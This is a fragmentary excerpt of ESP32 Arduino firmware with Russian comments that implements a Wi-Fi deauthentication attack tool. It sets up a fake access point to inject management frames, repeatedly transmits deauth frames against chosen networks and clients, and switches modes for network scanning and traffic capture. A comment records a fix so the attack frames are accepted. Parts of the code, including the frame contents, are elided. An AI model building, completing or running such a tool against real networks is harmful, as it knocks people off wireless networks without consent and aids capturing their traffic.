...
// ИСПРАВЛЕНО: unsupport frame type 0c0
// ═══════════════════════════════════════════════════════════════
...
void initWiFiForAttack() {
    // Полностью останавливаем WiFi
    WiFi.disconnect(true);
    esp_wifi_stop();
    delay(200);
    
    // Устанавливаем режим AP (точка доступа) - КРИТИЧНО для отправки management frames!
    WiFi.mode(WIFI_AP);
    delay(100);
    
    // Создаём фейковую точку доступа (нужна для отправки кадров)
    ...
    Serial.println("✅ WiFi готов к атаке (режим AP)");
}
...
void sendDeauthPacket(uint8_t* ap, uint8_t* client, int channel) {
    ...
    // Отправляем через AP интерфейс (КРИТИЧНО!)
    for (int i = 0; i < 3; i++) {
        esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, &deauthFrame, sizeof(deauthFrame), false);
        if (err != ESP_OK) {
            // Ошибку не выводим чтобы не спамить
        }
        delay(1);
    }
}
...
void scanNetworks() {
    ...
    // Останавливаем AP режим для сканирования
    WiFi.disconnect(true);
    esp_wifi_stop();
    delay(200);
    
    // Переключаемся в STA режим для сканирования
    WiFi.mode(WIFI_STA);
    delay(100);
...
void startDeauth(int networkNum) {
    ...
    // Инициализируем WiFi в режиме AP
    initWiFiForAttack();
...
void startCapture(int networkNum) {
    ...
    // Для capture нужен STA режим чтобы слушать
    WiFi.disconnect(true);
    esp_wifi_stop();
    delay(200);
    WiFi.mode(WIFI_STA);
...
void setup() {
    ...
    // Начальная инициализация WiFi в STA режиме
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
